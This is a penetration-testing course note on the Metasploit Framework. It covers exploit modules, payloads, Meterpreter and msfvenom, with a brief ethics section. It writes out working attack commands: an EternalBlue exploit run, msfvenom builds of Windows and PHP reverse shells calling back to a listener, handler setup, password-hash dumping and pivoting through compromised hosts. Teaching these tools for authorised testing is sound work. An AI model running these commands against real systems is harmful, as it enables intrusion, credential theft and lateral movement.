---
tags: [tools, vapt, utility]
difficulty: intermediate
module: "41 - Tools"
topic: "41.12 Metasploit Framework"
---

# 41.12 Metasploit Framework: The Penetration Testing Standard

## Introduction

The `Metasploit Framework` (MSF), maintained by Rapid7, is the world's most widely used exploitation framework. It is an open-source ruby-based platform that provides a standardized environment for developing, testing, and executing exploit code. 

Rather than writing custom scripts for every new vulnerability, penetration testers use Metasploit to leverage a massive, consistently updated database of exploits, payloads, encoders, and post-exploitation modules. It bridges the gap between discovering a vulnerability and actually gaining a functional shell on the target system.

### Why Metasploit?
- **Standardization**: Provides a uniform interface for thousands of different exploits.
- **Payload Generation**: Dynamically generates payloads (reverse shells, bind shells, meterpreter) for various architectures (x86, x64, ARM) and operating systems (Windows, Linux, macOS).
- **Post-Exploitation (Meterpreter)**: The Meterpreter payload is an advanced, memory-only stager that provides immense capabilities like privilege escalation, hash dumping, lateral movement, and pivoting.
- **Automation**: Workspaces, database integration, and resource scripts allow for highly automated and organized engagements.

## Architecture and Execution Flow

```text
+-------------------+       +-----------------------+       +-------------------+
|                   |       |                       |       |                   |
|   Attacker (MSF)  | ----> | 1. Execute Exploit    | ----> |   Target System   |
|   (msfconsole)    |       |    Module             |       |   (Vulnerable)    |
|                   |       |                       |       |                   |
+--------+----------+       +-----------+-----------+       +---------+---------+
         |                              |                             |
         |                              v                             |
         |                  +-----------------------+                 |
         |                  | 2. Inject Payload     |                 |
         |                  |    (e.g., shellcode)  |                 |
         |                  +-----------------------+                 |
         |                              |                             |
         |                              v                             |
         |                  +-----------------------+                 |
         |<---------------- | 3. Payload executes,  | <---------------+
                            |    returns connection |
                            |    (Reverse Shell)    |
                            +-----------------------+
```

The standard lifecycle in Metasploit involves:
1. Identifying a vulnerable service (e.g., via Nmap or [[11 - Nuclei]]).
2. Selecting the corresponding **Exploit** module in MSF.
3. Configuring the exploit options (RHOSTS, RPORT).
4. Selecting a **Payload** (what to do after the exploit succeeds).
5. Executing the exploit.
6. Interacting with the resulting session.

## Core Concepts

1. **Exploits**: Code that takes advantage of a specific vulnerability to deliver a payload.
2. **Payloads**: Code that runs on the target after successful exploitation.
   - *Staged*: Sends a small "stager" first, which then downloads the larger execution engine (e.g., `windows/meterpreter/reverse_tcp`).
   - *Inline (Stageless)*: The entire payload is sent at once (e.g., `windows/meterpreter_reverse_tcp`).
3. **Auxiliary**: Modules that perform scanning, fuzzing, or denial of service without providing a shell (e.g., SMB version scanners).
4. **Encoders**: Used to obfuscate payloads to avoid antivirus detection or eliminate bad characters (like null bytes `\x00`).
5. **Post**: Modules that run on compromised systems to gather information or pivot.

## Installation and Setup

Metasploit is pre-installed on Kali Linux. For other systems, the nightly installers are the best approach.
To start the console:
```bash
msfconsole
```
*Tip: Always initialize the database before starting to allow for workspace management and Nmap integration.*
```bash
sudo systemctl start postgresql
sudo msfdb init
msfconsole
```

## Detailed Usage and Methodology

### Database and Workspaces
Using the database keeps engagements organized.
- `workspace -a ClientA`: Create a workspace.
- `workspace ClientA`: Switch to the workspace.
- `db_nmap -sV -p- 192.168.1.100`: Run Nmap directly inside MSF and save results to the database.
- `hosts` / `services`: View saved data.

### Searching and Selecting Modules
The `search` command is incredibly powerful.
```text
msf6 > search type:exploit platform:windows eternalblue
```
To select a module:
```text
msf6 > use exploit/windows/smb/ms17_010_eternalblue
```

### Configuring and Running an Exploit
Once a module is selected, use `show options` to see what variables need to be set.
```text
msf6 exploit(...) > set RHOSTS 192.168.1.100
msf6 exploit(...) > set LHOST tun0
msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(...) > run
```
If successful, this will drop you into a `meterpreter >` prompt.

### Meterpreter Post-Exploitation
Meterpreter resides entirely in memory, making it stealthy.
- `sysinfo`: Get system information.
- `getuid`: See current user context.
- `hashdump`: Dump password hashes (requires SYSTEM privileges).
- `shell`: Drop into a standard OS command shell.
- `upload /local/file.txt C:\\Windows\\Temp\\file.txt`: Upload files.
- `portfwd`: Forward local ports to remote networks (Pivoting).

### MSFvenom: Standalone Payload Generation
`msfvenom` is a standalone tool included with the framework used to generate payloads (like executables, PHP scripts, or raw shellcode) for use outside of the `msfconsole`.

Generate a Windows reverse shell executable:
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o reverse.exe
```
Generate a PHP reverse shell:
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.php
```

### Setting up a Multi-Handler
If you generate a payload with `msfvenom` and execute it manually on the target (e.g., via a file upload vulnerability), you need Metasploit to "catch" the incoming connection.
```text
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 0.0.0.0
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > run -j
```
The `-j` flag runs the handler as a background job.

## Advanced Techniques

### Pivoting
If you compromise a dual-homed machine (connected to the internet and an internal network), you can use Metasploit to route attacks through the compromised host into the internal network.
1. In Meterpreter: `run autoroute -s 10.0.0.0/24`
2. Background the session (`Ctrl+Z`).
3. Now, any MSF module targeting `10.0.0.x` will tunnel through the Meterpreter session.

### Resource Scripts
You can automate MSF setup using `.rc` files.
Create `setup.rc`:
```text
use exploit/multi/handler
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST eth0
set LPORT 4444
exploit -j
```
Run it: `msfconsole -r setup.rc`

## Security and Ethical Considerations
- Metasploit exploits are real and can cause system instability, crashes (especially kernel-level exploits like EternalBlue), or data corruption.
- Meterpreter is widely recognized by almost all modern Antivirus and EDR solutions. Evading modern defenses requires custom loaders, not just standard MSF encoders.

## Chaining Opportunities
- Use [[11 - Nuclei]] or Nmap to find vulnerable services (e.g., Tomcat default credentials), then use MSF (`exploit/multi/http/tomcat_mgr_upload`) to gain a shell.
- Use [[09 - sqlmap]] to gain an `--os-shell` and execute a stager generated by `msfvenom` to upgrade to a full Meterpreter session.
- Once a foothold is gained via MSF, use [[14 - CrackMapExec NetExec]] or tools like BloodHound to map out the internal Active Directory environment.

## Related Notes
- [[11 - Nuclei]]
- [[09 - sqlmap]]
- [[14 - CrackMapExec NetExec]]
